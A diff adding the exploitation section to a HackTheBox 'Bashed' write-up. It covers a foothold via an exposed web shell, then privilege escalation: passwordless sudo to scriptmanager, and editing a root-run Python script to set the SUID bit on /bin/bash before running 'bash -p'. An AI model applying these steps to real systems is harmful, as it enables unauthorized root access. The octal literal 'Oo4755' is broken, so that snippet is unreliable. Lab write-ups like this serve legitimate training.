@@ -97,6 +97,10 @@ We got plenty of pages, let's take a look at each of them.
 - /php -> contains sendMail.php file. It might be teh backend for /contact.html. 
 -> uploads -> completely empty page
 
+## Exploitation
+
+### Gaining initial foothold
+
 Let's try digging more into /dev/phpbash.php.
 
 ![bashed terminal](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/bashed/bashed_terminal.png)
@@ -134,3 +138,105 @@ Now let's stabilize the shell first, then we will proced further to acquire flag
 Now following the same steps as before, we can acquire the user flag.
 
 ![user flag via reverse shell](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/bashed/user_flag.png)
+
+Cool, We have the initial foothold. Now turn for privilege escalation.
+
+
+### Privilege escalation
+
+We need some privilege checker tool. I have already downloaded linEnum.sh for this purpose in my local system, now it's turn to transfer it to victim machine. for this, start the python server in the folder containing linEnum.sh and then use wget in victim machine to fetch the file.
+
+![upload linenum.sh](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/bashed/upload_linenum.png)
+
+- change the executable permission of the taool. `chmod +x linenum.sh`.
+- run the tool. `./linenum.sh`
+- analyse the results.
+
+![scriptmanager explored](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/bashed/script_manager.png)
+
+Hmm, interesting. so we can run any command as scriptmanager without any password. So let's get into bash shell of scriptmanager user. `sudo -u scriptmanager /bin/bash` 
+
+So, we escalated horozintally. Check for odd things in the system. 
+```bash
+scriptmanager@bashed:/$ ls -al /
+total 92
+drwxr-xr-x  23 root          root           4096 Jun  2  2022 .
+drwxr-xr-x  23 root          root           4096 Jun  2  2022 ..
+-rw-------   1 root          root            174 Jun 14  2022 .bash_history
+drwxr-xr-x   2 root          root           4096 Jun  2  2022 bin
+drwxr-xr-x   3 root          root           4096 Jun  2  2022 boot
+drwxr-xr-x  19 root          root           4140 Jan 18 22:24 dev
+drwxr-xr-x  89 root          root           4096 Jun  2  2022 etc
+drwxr-xr-x   4 root          root           4096 Dec  4  2017 home
+lrwxrwxrwx   1 root          root             32 Dec  4  2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
+drwxr-xr-x  19 root          root           4096 Dec  4  2017 lib
+drwxr-xr-x   2 root          root           4096 Jun  2  2022 lib64
+drwx------   2 root          root          16384 Dec  4  2017 lost+found
+drwxr-xr-x   4 root          root           4096 Dec  4  2017 media
+drwxr-xr-x   2 root          root           4096 Jun  2  2022 mnt
+drwxr-xr-x   2 root          root           4096 Dec  4  2017 opt
+dr-xr-xr-x 174 root          root              0 Jan 18 22:24 proc
+drwx------   3 root          root           4096 Jan 18 22:25 root
+drwxr-xr-x  18 root          root            500 Jan 18 22:24 run
+drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin
+drwxrwxr--   2 scriptmanager scriptmanager  4096 Jun  2  2022 scripts
+drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv
+dr-xr-xr-x  13 root          root              0 Jan 18 23:52 sys
+drwxrwxrwt  10 root          root           4096 Jan 18 23:58 tmp
+drwxr-xr-x  10 root          root           4096 Dec  4  2017 usr
+drwxr-xr-x  12 root          root           4096 Jun  2  2022 var
+lrwxrwxrwx   1 root          root             29 Dec  4  2017 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
+scriptmanager@bashed:/$ 
+```
+
+All the files look good (owned by root), but a directory `scripts` look sus coz it's owned by scriptmanager. Let's explore it.
+
+It has two files: 
+- test.py
+```python
+f = open("test.txt", "w")
+f.write("testing 123!")
+f.close
+ ```
+
+- test.txt
+
+```text
+testing 123!
+```
+
+and also, test.txt files seems to be updated frequently.
+
+![file updated](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/bashed/file_updated.png)
+
+whoaa, my hacker sense it tingling. 
+
+test.py is updating test.txt every moment. since test.txt is owned by root, to modify this file, test.py also must be running as root, 😵. So here we are with a python script test.py which is running as root every moment. fkn diabolical! 👿.
+
+From here on, we can follow multiple paths to gain root access on the system. for now, let's add suid bit to bin/bash so that we can directly access bash terminal of root. the updated python script for this would be:
+```python
+import os
+os.chmod('/bin/bash', Oo4755)
+``` 
+
+after a moment, the suid bit of /bin/bash will get changed and we can access the root. so let's update the test.py file.
+
+```bashscriptmanager@bashed:/scripts$ ls -al /bin/bash
+-rwxr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
+scriptmanager@bashed:/scripts$ ls -al /bin/bash
+-rwsr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
+scriptmanager@bashed:/scripts$ /bin/bash -p
+bash-4.3# whoami
+root
+bash-4.3#   
+```
+
+![I am root](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/bashed/root.png)
+
+Now you can simply get the root flag by traversing to root directory.
+
+![root flag](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/bashed/root_flag.png)
+
+And We are done. Until we meet again ;)
+
+![bashed pwned](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/bashed/bashed_pwned.png)
